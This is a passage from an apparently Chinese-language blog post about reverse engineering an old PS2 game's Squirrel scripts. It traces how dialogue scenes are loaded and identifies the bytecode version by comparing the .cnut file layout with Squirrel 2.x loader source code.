class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// 行頭禁則</span><br><span class="line">kinsokuText &lt;- &#123;</span><br><span class="line">    [&quot;。&quot;] = true,</span><br><span class="line">    [&quot;，&quot;] = true,</span><br><span class="line">    [&quot;、&quot;] = true,</span><br><span class="line">    [&quot;．&quot;] = true,</span><br><span class="line">    [&quot;：&quot;] = true,</span><br><span class="line">    [&quot;；&quot;] = true,</span><br><span class="line">    [&quot; ゛ &quot;] = true,</span><br><span class="line">    [&quot; ゜ &quot;] = true,</span><br><span class="line">    [&quot; ヽ &quot;] = true,</span><br><span class="line">    [&quot; ヾ &quot;] = true,</span><br><span class="line">    [&quot; ゝ &quot;] = true,</span><br><span class="line">    [&quot; ゞ &quot;] = true,</span><br><span class="line">    [&quot;々&quot;] = true,</span><br><span class="line">    [&quot;’&quot;] = true,</span><br><span class="line">    [&quot;”&quot;] = true,</span><br><span class="line">    [&quot;）&quot;] = true,</span><br><span class="line">    [&quot;〕&quot;] = true,</span><br><span class="line">    [&quot;］&quot;] = true,</span><br><span class="line">    [&quot;｝&quot;] = true,</span><br><span class="line">    [&quot;〉&quot;] = true,</span><br><span class="line">    [&quot;》&quot;] = true,</span><br><span class="line">    [&quot;」&quot;] = true,</span><br><span class="line">    [&quot;』&quot;] = true,</span><br><span class="line">    [&quot;】&quot;] = true,</span><br><span class="line">    [&quot;°&quot;] = true,</span><br><span class="line">    [&quot;′&quot;] = true,</span><br><span class="line">    [&quot;″&quot;] = true,</span><br><span class="line">    [&quot;℃&quot;] = true,</span><br><span class="line">    [&quot;￠&quot;] = true,</span><br><span class="line">    [&quot;％&quot;] = true,</span><br><span class="line">    [&quot;‰&quot;] = true,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function isKinsoku(ch)</span><br><span class="line">&#123;</span><br><span class="line">    return ch in kinsokuText;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着往下看 <code>obj</code> 为 <code>null</code> 会被如何处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if (obj == null) &#123;</span><br><span class="line">    // シナリオ終了</span><br><span class="line">    //dm(&quot; シナリオ終了 cur:&quot; + curStorage + &quot; next:&quot; + nextStorage) ;</span><br><span class="line">    local next = nextStorage;</span><br><span class="line">    if (next == null || next == 0) &#123;</span><br><span class="line">        next = getNextScene(curStorage);</span><br><span class="line">    &#125;                    </span><br><span class="line">    dm(&quot;next:&quot; + next);</span><br><span class="line">    if (next != null &amp;&amp; next != &quot;&quot; &amp;&amp; next != 0) &#123;</span><br><span class="line">        goToNext(next);</span><br><span class="line">        continue;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        status = STOP;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释，如果 <code>obj</code> 为 <code>null</code>，那么代表剧本结束，进入下一个场景，因此当需要播放声音时，<code>obj</code> 不应该为 <code>null</code>。在往下看 obj 如何被处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">if (obj.tagname == &quot;label&quot;) &#123; // ラベル処理</span><br><span class="line">    // ...</span><br><span class="line">&#125; else if (obj.tagname == &quot;begintrans&quot;) &#123;</span><br><span class="line">    // ...</span><br><span class="line">&#125; else if (obj.tagname == &quot;ch&quot;) &#123;</span><br><span class="line">    doText(obj.text);</span><br><span class="line">    continue;</span><br><span class="line">&#125; else if (obj.tagname == &quot;embex&quot;) &#123; // 変数埋め込みの参照</span><br><span class="line">    if (&quot;exp&quot; in obj) &#123;</span><br><span class="line">        local text = ::eval(obj.exp);</span><br><span class="line">        if (typeof text == &quot;string&quot;) &#123;</span><br><span class="line">            doText(text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    continue;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // その他のコマンド</span><br><span class="line">    </span><br><span class="line">    // 実行時判定される cond</span><br><span class="line">    if (&quot;condex&quot; in obj) &#123;</span><br><span class="line">        if (!::eval(obj.condex)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        //delete obj.condex;</span><br><span class="line">    &#125; else if (&quot;if&quot; in obj) &#123;</span><br><span class="line">        if (!::eval(obj[&quot;if&quot;])) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        //delete obj[&quot;if&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // onTag を呼ぶ</span><br><span class="line">    local step = onTag(obj);</span><br><span class="line">    if (step == null) &#123;</span><br><span class="line">        throw &quot;onTag が null を返しました (&quot; + obj.tagname + &quot;)&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    step = step.tointeger(); // step を数値に</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在调用 <code>onTag</code> 前并没有生成新的 <code>obj</code>，那么到此为止生成的 <code>obj</code> 只是为了处理 <code>currentText</code> 开头的标点，则其他的 <code>obj</code> 只能来自类的静态变量 <code>pendings</code> 队列或者 <code>lines</code> 数组。首先看看 <code>pendings</code> 从哪里来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * タグ割り込み処理</span><br><span class="line"> */</span><br><span class="line">function addTag(name, elm) &#123;</span><br><span class="line">    local e;</span><br><span class="line">    if (elm != null) &#123;</span><br><span class="line">        e = clone elm;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (name != null) &#123;</span><br><span class="line">        e.tagname &lt;- name;</span><br><span class="line">    &#125;</span><br><span class="line">    pendings.append(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * タグ割り込み処理</span><br><span class="line"> */</span><br><span class="line">function insertTag(name, elm) &#123;</span><br><span class="line">    local e;</span><br><span class="line">    if (elm != null) &#123;</span><br><span class="line">        e = clone elm;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (name != null) &#123;</span><br><span class="line">        e.tagname &lt;- name;</span><br><span class="line">    &#125;</span><br><span class="line">    pendings.insert(0, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>run</code> 循环中的 <code>pendings</code> 主要添加的是已有的 <code>obj</code>，因此 <code>pendings</code> 的其他值只能通过函数 <code>addTag</code> 以及 <code>insertTag</code> 添加。这两个函数都会添加一个 <code>elm</code>，也就是 <code>obj</code>，并且将 <code>name</code> 作为 <code>tagname</code>，所以接下来找找哪些地方调用了这些函数。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/19.jpg" alt="Not Found"></p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/20.jpg" alt="Not Found"></p><p>很可惜，在所有的搜索结果中，没有找到调用 <code>entryvoice</code> 以及 <code>dispname</code> 的代码，因此 <code>pendings</code> 并不是我们的目标，那么来看看 <code>lines</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/21.jpg" alt="Not Found"></p><p><code>lines</code>并没有写值操作，但是有赋值操作 <code>lines = getScene(curStorage)</code>，都是在 <code>28_43000_d330.nut</code> 中.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 実行開始</span><br><span class="line"> * @param storage 開始シナリオ</span><br><span class="line"> * @param option パース用オプション</span><br><span class="line"> */</span><br><span class="line">function start(storage) &#123;</span><br><span class="line">    dm(&quot; シーン再生開始 &quot;);</span><br><span class="line">    clearForStart();</span><br><span class="line">    curStorage = storage;</span><br><span class="line">    lines = getScene(curStorage);</span><br><span class="line">    </span><br><span class="line">    prevSkipMode = null;</span><br><span class="line">    currentText = &quot;&quot;;</span><br><span class="line">    status = RUN;</span><br><span class="line">    // 初期変数保存</span><br><span class="line">    savef = clone f;</span><br><span class="line">    savePrepare();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * ロード処理</span><br><span class="line"> * ゲーム変数からシナリオ状態変数を読み込んでから実行開始</span><br><span class="line"> */</span><br><span class="line">function load() &#123;</span><br><span class="line">    dm(&quot; シーンロード開始 &quot;);</span><br><span class="line">    clearForStart();</span><br><span class="line">    </span><br><span class="line">    if (savef.storage != &quot;&quot;) &#123;</span><br><span class="line">        dm(&quot; ロード対象:&quot; + savef.storage);</span><br><span class="line">        dm(&quot; ロードまでの分岐数:&quot; + savef.branchCount);</span><br><span class="line">        dm(&quot; ロード先:&quot; + savef.targetPage);</span><br><span class="line">        curStorage = savef.storage;</span><br><span class="line">        lines = getScene(curStorage);</span><br><span class="line">        if (lines == null) &#123;</span><br><span class="line">            dm(&quot; ロード失敗 &quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 分岐情報復帰</span><br><span class="line">        for (local i=0;i&lt;savef.branchCount;i++) &#123;</span><br><span class="line">            targetBranches.append(savef[&quot;branch&quot;+i]);</span><br><span class="line">            //dm(&quot; 分岐:&quot; + savef[&quot;branch&quot;+i]);</span><br><span class="line">        &#125;</span><br><span class="line">        // ページ番号復帰</span><br><span class="line">        targetPage = savef.targetPage;</span><br><span class="line">        // 変数復帰</span><br><span class="line">        f = clone savef;</span><br><span class="line">        // 時間復帰</span><br><span class="line">        currentTick = savef.time;</span><br><span class="line">        prevSkipMode = null;</span><br><span class="line">        currentText = &quot;&quot;;</span><br><span class="line">        status = RUN;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dm(&quot; ロード失敗 &quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 次のシナリオに接続</span><br><span class="line"> */</span><br><span class="line">function goToNext(next) &#123;</span><br><span class="line">    clearInfo();</span><br><span class="line">    curStorage = next;</span><br><span class="line">    lines = getScene(curStorage);</span><br><span class="line">    savef = clone f;</span><br><span class="line">    savePrepare();</span><br><span class="line">    status = RUN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这三个函数名以及注释，连蒙带猜可能 <code>lines</code> 在每次加载新场景时，该场景内部所有的对话被 <code>getScene</code> 统一读入 <code>lines</code> 中。看看位于同一文件的 <code>getScene</code> 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * シーンファイルを変換してデータとして取得する</span><br><span class="line"> * @param name シーン名</span><br><span class="line"> */</span><br><span class="line">function getScene(name) &#123;</span><br><span class="line">    // グローバルのシーン取得関数を使う</span><br><span class="line">    try &#123; </span><br><span class="line">        return ::getScene(name)();</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        dm(&quot;error in loading:&quot; + e);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数 <code>name</code> 是场景名，很有可能是字符串。根据注释“转换场景文件作为数据获取”，证明我们的猜测可能是正确的。在 <code>Squirrel</code> 中函数或变量名前的 <code>::</code> 代表调用的全局空间的函数而不是类函数，因此调用的是全局空间的同名函数。该全局函数返回值也是一个可调用的对象，可能也是回调函数。</p><blockquote><p>Global variables are stored in a table called the root table. Usually in the global scope the environment object is the root table, but to explicitly access the closure root of the function from another scope, the slot name must be prefixed with ‘::’</p></blockquote><p>然而在所有的明文脚本代码中并没有找到任何全局 <code>getScene</code> 的定义。很明显这个函数不是标准库函数，实际上脚本中出现了不少类似调用没有定义的函数，例如前文的 <code>Talk</code>，这类函数甚至在字节码中也找不到符号，推测这些函数可能定义在二进制程序中，测试一下</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/22.jpg" alt="Not Found"></p><p>果然，在游戏主程序 <code>SLPS_258.97</code> 中，除了调用字符串，还出现了单独的符号，那么接下来就是针对 32 位 MIPS 程序 <code>SLPS_258.97</code> 的逆向，不过还是得先看看剩下的几个 <code>.cnut</code> 字节码文件里有没有值得关注的信息，首先需要想办法反编译 <code>.cnt</code>。</p><h1 id="字节码反编译"><a href="# 字节码反编译" class="headerlink" title="字节码反编译"></a>字节码反编译 </h1><p> 对于反编译来说，Squirrel 是一个比较坑的语言，兼容性极差，甚至每个小版本的字节码都不一样，并且 <code>.cnut</code> 文件中没有标注是哪个版本的 Squirrel，因此反编译及其困难。</p><p>目前已经有的针对 Squirrel 的反编译器主要有以下 3 个：</p><ol><li><a href="http://www.mediafire.com/?ruulm32z36i5dff">NutCracker - DamianXVI</a></li><li><a href="https://github.com/darknesswind/NutCracker">NutCracker - darknesswind</a></li><li><a href="https://github.com/SydMontague/NutCracker">NutCracker - SydMontague</a></li></ol><p>其中的 2 和 3 都是基于 1 的改进，而 1 最初来源 <a href="http://cheatengine.org/forum/viewtopic.php?p=5477214&sid=00a71666ea27fea14168c6d158f69724">CE 论坛</a>，仅支持 32 位的 Squirrel 2.2.4，不支持 unicode 编码。而 2 基于 1 实现了同版本 64 位的反编译，3 基于 1 实现了针对 Squirrel3 的反编译，同时支持 unicode 编码，此外还提供了一个 010 Editor 的模版供分析。很明显，在这个上古游戏的时代必不可能用 Squirrel3 开发，因此只能是 Squirrel2 的某个版本。查看一下 Squirrel2 的<a href="https://sourceforge.net/projects/squirrel/files/squirrel2/"> 历史版本</a>，主要有以下 15 个稳定版本：<code>2.0</code>，<code>2.0.[1-5]</code>，<code>2.1</code>，<code>2.1.[1-2]</code>，<code>2.2</code>，<code>2.2.[1-5]</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/31.jpg" alt="Not Found"></p><p>以上 3 个工具反编译我们提取出的字节码全部失败，那么我们就需要自己魔改其中的一个，由于 3 提供了 010 的模版，因此先用 3 来验证一下我们提取出的字节码是哪个版本。由于明文脚本中使用了大量双字节日语，因此为了避免干扰我们的分析，我们找一个最小的，没有出现日文的 <code>41_e2000_36f.nut</code> 用 010 分析一下。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/29.jpg" alt="Not Found"></p><p>不出意外，果然失败了，先分析一下为什么失败。模版是针对 Squirrel3 的字节码，因此看看模版里定义的结构和我们的文件有什么不同。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/30.jpg" alt="Not Found"></p><p>首先是 2 个字节的 <code>fafa</code>，然后是 4 个字节的 <code>RIQS</code>，然后是 4 个字节的 <code>sizeChar</code>，但是在模版中接下来就是用于分片的 <code>TRAP</code>，少了 <code>sizeInt</code> 以及 <code>sizeFloat</code>。考虑到这个游戏的发行年份，我们找一个 Squirrel 2.2.4 的源码分析一下 Squirrel 2 的 <code>.cnut</code> 字节码结构是什么样的。</p><p>首先找找字节码文件头 <code>0xfafa</code> 的定义，在 <code>squirrel/sqapi.cpp</code> 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SQ_BYTECODE_STREAM_TAG    0xFAFA</span></span><br></pre></td></tr></table></figure><p>然后找找 <code>SQ_BYTECODE_STREAM_TAG</code> 的引用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SQRESULT <span class="title">sq_readclosure</span><span class="params">(HSQUIRRELVM v,SQREADFUNC r,SQUserPointer up)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQObjectPtr closure;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> tag;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">r</span>(up,&amp;tag,<span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sq_throwerror</span>(v,_SC(<span class="string">&quot;io error&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(tag != SQ_BYTECODE_STREAM_TAG)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sq_throwerror</span>(v,_SC(<span class="string">&quot;invalid stream&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(!SQClosure::<span class="built_in">Load</span>(v,up,r,closure))</span><br><span class="line">        <span class="keyword">return</span> SQ_ERROR;</span><br><span class="line">    v-&gt;<span class="built_in">Push</span>(closure);</span><br><span class="line">    <span class="keyword">return</span> SQ_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查完文件头后进入 <code>squirrel/sqobject.cpp</code> 的 <code>SQClosure::Load</code> 加载字节码文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQClosure::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_HEAD));</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,<span class="built_in">sizeof</span>(SQChar)));</span><br><span class="line">    SQObjectPtr func;</span><br><span class="line">    _CHECK_IO(SQFunctionProto::<span class="built_in">Load</span>(v,up,read,func));</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_TAIL));</span><br><span class="line">    ret = SQClosure::<span class="built_in">Create</span>(_ss(v),_funcproto(func));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SQ_CLOSURESTREAM_HEAD</code> 就是小端的 <code>SQIR</code>，检查完后读取 4 个字节的 <code>sizeof(SQChar)</code>，因此在 Squirrel2 中没有 <code>sizeInt</code> 以及 <code>sizeFloat</code>，读取完后进入 <code>SQFunctionProto::Load</code>，看名字应该是读函数。那么我们先修改模版，注释掉 <code>NutHeader</code> 的 <code>sizeInt</code> 以及 <code>sizeFloat</code> 看看解析结果。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/32.jpg" alt="Not Found"></p><p>果然又失败了，看看报错原因发现是没有匹配到 <code>TRAP</code>，那么代表肯定在模版中多了几个字节。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/33.jpg" alt="Not Found"></p><p>通过核对数据，发现这里匹配失败，<code>TRAP</code> 被解析成了 <code>nFunctions</code>，那么再看看模版中 <code>NutFunction</code> 结构。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/34.jpg" alt="Not Found"></p><p>其中的 <code>ConfirmOnPart</code> 就是读取 4 个字节检查是否是 <code>TRAP</code>。很明显，<code>nFunctions</code>前面多了 4 个字节才导致识别错位到下一个 <code>TRAP</code>，继续看看 <code>Squirrel 2.2.4</code> 的源码中定义的结构。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQFunctionProto::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQInteger i, nliterals,nparameters;</span><br><span class="line">    SQInteger noutervalues ,nlocalvarinfos ;</span><br><span class="line">    SQInteger nlineinfos,ninstructions ,nfunctions,ndefaultparams ;</span><br><span class="line">    SQObjectPtr sourcename, name;</span><br><span class="line">    SQObjectPtr o;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, sourcename));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, name));</span><br><span class="line">    </span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nliterals, <span class="built_in">sizeof</span>(nliterals)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nparameters, <span class="built_in">sizeof</span>(nparameters)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;noutervalues, <span class="built_in">sizeof</span>(noutervalues)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlocalvarinfos, <span class="built_in">sizeof</span>(nlocalvarinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlineinfos, <span class="built_in">sizeof</span>(nlineinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ndefaultparams, <span class="built_in">sizeof</span>(ndefaultparams)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ninstructions, <span class="built_in">sizeof</span>(ninstructions)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nfunctions, <span class="built_in">sizeof</span>(nfunctions)));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这里的结构和模版中一样，那么可以证明我们需要的 Squirrel2 版本一定小于 2.2.4，可以进一步缩小我们的目标范围。那么继续分析 2.2.4 之前的版本，最后在 2.1.2 中发现缺少了 <code>ndefaultparams</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQFunctionProto::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQInteger i, nliterals,nparameters;</span><br><span class="line">    SQInteger noutervalues ,nlocalvarinfos ;</span><br><span class="line">    SQInteger nlineinfos,ninstructions ,nfunctions ;</span><br><span class="line">    SQObjectPtr sourcename, name;</span><br><span class="line">    SQObjectPtr o;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, sourcename));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, name));</span><br><span class="line">    </span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nliterals, <span class="built_in">sizeof</span>(nliterals)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nparameters, <span class="built_in">sizeof</span>(nparameters)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;noutervalues, <span class="built_in">sizeof</span>(noutervalues)));</span><br><span class="line">    